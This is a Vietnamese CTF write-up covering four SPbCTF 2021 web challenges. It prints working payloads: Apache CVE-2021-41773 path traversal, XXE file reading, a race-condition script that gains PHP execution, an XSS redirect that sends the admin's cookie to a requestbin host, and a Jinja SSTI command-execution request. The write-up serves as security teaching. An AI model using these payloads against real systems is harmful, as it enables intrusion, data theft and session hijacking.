---
layout: post
title: "[WRITEUP SPbCTF 2021]: WEB"
categories: CTF
toc: true
---
Dưới đây là một số challenge mình giải quyết được trong SPbCTF's Student CTF 2021 Quals.

Tất cả source code mình sẽ để ở đây nhé [SOURCE](https://github.com/DauHoangTai/WriteupCTF/tree/master/2021/sbctf)

## Challenge BLT
Ở challenge này thì chúng ta được cung cấp `Dockerfile` và `docker-compose`.

Ở docker-compose thì thấy được server chạy apache, trong Dockerfile thì có đoạn
```
<Directory \"/\">\n \
 Require all granted\n \
</Directory>\n \
</VirtualHost>" > /usr/local/apache2/conf/apache.conf
```
Khá giống với CVE của apache 2.4.49 gần đây. Dùng burp để bắt lại request và thấy header `server` trả về đúng là Apache/2.4.49

![image](https://user-images.githubusercontent.com/54855855/136956286-03b5ebe9-7c98-42b3-bcf6-7b35da516419.png)

Vậy nên bây giờ thử payload của CVE-2021-41773 thôi.
```
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

![image](https://user-images.githubusercontent.com/54855855/136956499-bdac12e5-3531-4a6d-8120-cb742dd37557.png)
Kết quả Path Traversal và đọc được file /etc/passwd => bây giờ chỉ cần đọc flag thôi.

### Payload
```
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd -> read /etc/passwd
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/flag.txt -> read /flag.txt
```

### Flag
`spbctf{th3_lat3st_d03s_n0t_m3an_s3cur3}`

## Challenge 31 Line PHP
Bài nay được cung cấp code php như sau và các luồng hoạt động cơ bản của code mình comment ở code bên dưới luôn nhé.
```php
<?php
session_start();
if (!isset($_POST["data"])) { //kiểm tra có tham số data
    highlight_file(__FILE__);
    die();
}
if (!isset($_SESSION["id"])) { // không có sess id thì sẽ tạo 1 chuỗi md5 với random 16 byte
    $_SESSION["id"] = md5(random_bytes(16));
}
$id = $_SESSION["id"];
echo "Welcome, $id\r\n"; // in ra sess id được tạo ở trên

if (!file_exists("/var/www/html/upload/" . $id)) { // check folder
    mkdir("/var/www/html/upload/" . $id, 0755, true);
}
$name = $_FILES["data"]["name"]; //gán name của file mình upload lên vô biến $name
move_uploaded_file($_FILES["data"]["tmp_name"],"/var/www/html/upload/$id/$name"); //move file up lên -> /var/www/html/upload/$id/$name
if (PHP_VERSION_ID < 80000) {
    // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
    // disabled by default, so this function is no longer needed to protect against XXE attacks.
    $loader = libxml_disable_entity_loader(true);
}
$xmlfile = file_get_contents("/var/www/html/upload/$id/$name"); // Read content của file up lên.
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT); //Load xml
$creds = simplexml_import_dom($dom);
$user = $creds->user;
$pass = $creds->pass;
echo "You have logged in as user $user";
unlink("/var/www/html/upload/$id/$name"); // xóa file up lên sau khi end chương trình
?>
```
- Chú ý ở cuối chương trinh sau khi chạy chương trình chạy xong thì sẽ unlink cái file của mình load vào (xóa file).
- Đầu tiên mình tham số cho POST `data` và upload 1 file xml lên.
- Tạo một file `html` để upload file

```
<form action="http://62.84.114.238/" method="post" enctype="multipart/form-data">
  <input type="file" id="data" name="data">
  <input type="submit">
</form>
```
![image](https://user-images.githubusercontent.com/54855855/137078496-5f7c387a-8aab-424f-928e-5ebd5aad306b.png)
Sau khi dung burp bắt lại là thêm parameter `data` thì được request như trên hình.
- Bây giờ cân thay `abc` bằng content của file xml để nó có thể in ra `You have logged in as user ...`

Request cho ai cần:
```xml
POST / HTTP/1.1
Host: 62.84.114.238
Content-Length: 458
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6KCDZD95hvtjgRwl
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=6c1df1166b66365e482a4841d920172e
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary6KCDZD95hvtjgRwl
Content-Disposition: form-data; name="data"; filename="file_load.txt"
Content-Type: text/plain

<!--?xml version="1.0" ?-->
<creds>
<user>taidh</user>
<pass>taidh1</pass>
</creds>
------WebKitFormBoundary6KCDZD95hvtjgRwl
Content-Disposition: form-data; name="data";
Content-Type: text/plain

taidh
------WebKitFormBoundary6KCDZD95hvtjgRwl--
```

Content file mình truyền vào.
```xml
<!--?xml version="1.0" ?-->
<creds>
<user>taidh</user>
<pass>taidh1</pass>
</creds>
```
Kết quả trả về.
![image](https://user-images.githubusercontent.com/54855855/137316945-a18000b8-cc8d-4e76-80a2-00c00d4742cb.png)

- Tiếp tục thử xxe injection vào chỗ `user`

Payload xxe injection
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<creds>
<user>&file;</user>
<pass>taidh1</pass>
</creds>
```
Kết quả là nhận được content của file /etc/passwd nhưng chúng ta không biết flag ở đâu và để có thể đọc được.

![image](https://user-images.githubusercontent.com/54855855/137317353-adbbcf59-a063-4da8-a383-30c384c8111f.png)

- Thì tới đây chúng ta cần RCE để biết được flag ở đâu và đọc được nó. Có một chỗ quan trọng trong code mà chúng ta lợi dụng để có thể RCE là `unlink`, lúc chương trình `unlink` sẽ mất 1 khoảng thời gian, và chúng ta sẽ lợi dụng nó race condition, upload 1 file php lên và file đó sẽ vẫn còn tồn lại và từ đó có thể chạy được file php.
- Truy cập vào `upload/id/my_file.php` để đọc chạy file php.

### Payload
- Code race `race.py`. Mọi người nhớ thay session và id nhé.
```
import requests
import string
import sys
import threading

r = requests.session()

url = "http://62.84.114.238/"
cookie={ "PHPSESSID":"6c1df1166b66365e482a4841d920172e"} # thay session

def upload():
    files = {"data": open("check.php", "rb")}
    res = r.post(url, files=files,data={"data":"taidh"},cookies=cookie)
    print(res.text)

def excute_php():
    a = r.get(url+"upload/cf8828cf95abdb5e046d30e4f6006588/check.php") #thay id
    print(a.text)


if __name__ == "__main__":
    for i in range(1,500):
        t = threading.Thread(target = upload)
        t1 = threading.Thread(target = excute_php)

        t.start()
        t1.start()
```
- File `check.php`
```php
<?php
file_put_contents("/var/www/html/upload/cf8828cf95abdb5e046d30e4f6006588/check_info.php", "<?php phpinfo(); ?>") // thay id cùng với ở trên code race
?>
```
- Chạy code tầm vài 3 lần thì access vô `http://62.84.114.238/upload/cf8828cf95abdb5e046d30e4f6006588/check_info.php` thì thấy được trang `phpinfo()`.
- Chú ý ở `disable_function` trong trang phpinfo thì thấy được các function có thể RCE đã bị disable
![image](https://user-images.githubusercontent.com/54855855/137321548-427d5b07-3c4d-4f35-9c4f-6f1d917ce62a.png)

Tới đây thì đọc lại description của bài `On the last step, you’ll need a recently published 0day.` => mình đã nhớ đến 1 0day gần đầy có thể bypass disable function và từ đó có thể RCE.

Link [Bypass disable function](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass).

File `shell.php` (mình để trong github, ở trên cùng của bài viết nhé) mình chỉ thay chỗ `pwn('/./readflag > /tmp/taidh');` (đây là cách mình đọc flag luôn). Để show thì các bạn thay bằng `pwn('ls > /tmp/taidh');` nhé.

- Cuối cùng chỉ cần sửa trên code race file `check.php` thành `shell.php`.

Read flag bằng cách ở trong file xml sửa thành `file:///tmp/taidh`.

Flag -> `spbctf{XX3_2_rCe_w3Ll_D0n3}`
![image](https://user-images.githubusercontent.com/54855855/137323074-2665c57c-bfa3-4f45-abed-014ca748720f.png)

## Challenge RozHook
Đầu tiên đăng kí 1 account và login vào. Ở `/pro` thì hiện so sánh giữa account pro và account free.
![image](https://user-images.githubusercontent.com/54855855/137325400-69434d10-fc6e-4a88-aca1-68bf10cda9ef.png)
Cụ thể ở đây account của chúng ta đang là free, nhưng không thể `BUY PRO NOW`. Ghi nhớ những chức năng có thể sử dụng khi lên account pro nhé. Xíu nữa sẽ cần đến nó.

Service có một số endpoint:
- `/profile` -> tạo webhook
- `/change_password` -> change password
- `/report` -> send url và bot sẽ request tới.

Ở `/change_password` chỉ là change password nên không có gì exploit, mình chỉ quan tâm đến `/profile` và `/report`.
- `/report` thì thấy được send 1 url bất kì và bot sẽ request vào và hiện thông báo `Your idea/report successfully sended to admins. Thank you!` => có thể bài này là xss.
- `/profile` -> khi tạo 1 webhook thì trong đó sẽ có delete, change template và select. Ở đây mình chỉ quan tâm đến change template và select. Hiện tại thì chỉ có thể chọn được 1 trong 5 template. Chú ý thì cả 5 template sử dụng {{}} vì vậy có thể ssti ở đây nếu như chúng ta có thể thay đổi được content của template.

Đến đây thì nhớ về lúc đầu ở `/pro` khi account pro thì có thể tạo template và số webhook được tạo không giới hạn.

IDEA: `xss` (lấy cookie của admin để lên pro) -> `SSTI` (tạo template mới) -> RCE và lấy flag.
- Đầu tiên là cần đi tìm chỗ có thể trigger được xss. Chú ý ở chỗ change template thì thấy ở template 3 và 5 đều có tham số `url` mình có thể control
- `url` được truyền vô src của thẻ `img` => có thể escape để xss
- Nhưng ở template 3 thì có dấu `"` nên chúng ta cần escape `"` để có thể thêm `onerror=alert(1)`. Đời không như là mơ thì chương trình đã sử dụng htmlencode => không thể escape dấu "`"
- Payload mình sử dụng cho template 3 -> `?url=a" onerror="alert(1)` => kết quả ![image](https://user-images.githubusercontent.com/54855855/138673740-12277857-a74c-40cb-8e61-f41633e36751.png)
- Nhìn kĩ thì ở template 5 cũng truyền `url` nhưng ở thẻ `img` không có `"` => không cần escape dấu `"` => không bị ảnh hưởng bởi htmlencode ![image](https://user-images.githubusercontent.com/54855855/138675481-82b0f4f6-e45d-4fbc-895d-bc8799e9bbec.png)
- Payload cho template 5 `?url=a onerror=alert(1)` => kết quả
![image](https://user-images.githubusercontent.com/54855855/138675690-d69c888d-5540-4989-a491-68d305fdabc7.png)

Vậy bây giờ chỉ cần lấy cookie của bot trả về là sẽ lên account pro, nhưng đến đoạn gửi url cho bot thì lại bị một số vẫn đề:
- url của mình gửi cho bot không được dài quá 128 char.
- Payload mình gửi ở `/report` -> 
```
https://rozhook.xyz/h/5a2e760c42c8c7bfcc2be2dd56ba038004ce66da?url=a onerror=document.location="http://requestbin.net/r/gx9eqwnc?cc="%2bdocument.cookie
```
- Chương trình thông báo: ![image](https://user-images.githubusercontent.com/54855855/138676916-e5d259f5-34fe-47d2-972d-1e05bf764ea1.png)
- Ở đây mình sẽ bypass chỗ này bằng cách `redirect`.
- File `index.php` mình host:
```php
<?php
header('Location: https://rozhook.xyz/h/5a2e760c42c8c7bfcc2be2dd56ba038004ce66da?url=a onerror=document.location="https://requestbin.net/r/gx9eqwnc?cc="%2bdocument.cookie');
```
- Chạy `php -S 0.0.0.0:1234` trên server
- Send `http://ip:1234/index.php` cho Url ở `/report`
![image](https://user-images.githubusercontent.com/54855855/138680668-f1273f8e-99e0-480d-a07a-67f553ef45a9.png)
- Thay cookie mà bot gửi về cho chúng ta => acccount đã lên pro

Nhưng sau khi lên pro thì mình cũng không thể click vào `Create Template`. Stuck ở đây khá lâu và đi check các file JS thì thấy được có 1 api được giấu ở file `https://rozhook.xyz/static/js/main.js` ![image](https://user-images.githubusercontent.com/54855855/138681638-e0aeb5a8-3d30-46de-9cbd-974c719684cf.png)

Truy cập api trên và tạo template mới có thể rce (SSTI):
- Payload tạo template mới ![image](https://user-images.githubusercontent.com/54855855/138683096-9161a2d6-c7e1-4145-a72e-d047e12f047e.png)
- Qua bên webhook của mình thì thấy đã có thêm 1 template được add vô ![image](https://user-images.githubusercontent.com/54855855/138683199-2aa4dc82-7a4f-4d2e-9b6f-55dac82b25c9.png)
- Tuy cập nó và có flag

### Summary Payload
Get cookie để lên tài khoản pro
```php
<?php
header('Location: https://rozhook.xyz/h/5a2e760c42c8c7bfcc2be2dd56ba038004ce66da?url=a onerror=document.location="https://requestbin.net/r/gx9eqwnc?cc="%2bdocument.cookie');
```
Add template to SSTI (get flag)
```
POST /api/v0.5/template/add HTTP/1.1
Host: rozhook.xyz
...
Cookie: session=.eJwlj8FqBDEMQ_8l5x4cZ2LH-zPBsZ12KDuFmd3DUvrvDexNEjwh_aY-z7i-0u1xPuMj9d3TLVUly2yOJGZcWislMxMV9Dli5mgZstdZpLYWqJOhVozYRIxBNVvDIls1X_wQ0jkxNmNd_CRYWoqMSoSDsZEFcs1RHUopGiBpDXlecb7X4LJ2nbM_fr7jWAGIAiEGGsKkVQotu0Bj0bFaYniTzW0sbr_6XQ_9DO_j1dXv-_G--vcP8m5Jdg.YXaJAw.1lFvTwPP-GYjngYnN5o6H2IjVzY
Content-Type: application/json
Content-Length: 93

{"data": "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/flag.txt').read()}}"}
```
Flag -> `spbctf{m@yb3_i_sh0uld_m@k3_an0ther_s3rvic3}`

## Free Cloud
Ở bài này mình chỉ brute ở `location` vì khi hoàn tất các bước và send lên thì nhận được thông báo `There are no free servers in this location` => thử brute hoặc thay bằng location khác.

### Payload
![image](https://user-images.githubusercontent.com/54855855/138684379-e929b93e-1fcf-4b8a-96b9-1c0c2aa773c2.png)

Flag -> `spbctf{b3_c4r3fu1_w17h_grpc_3num5}`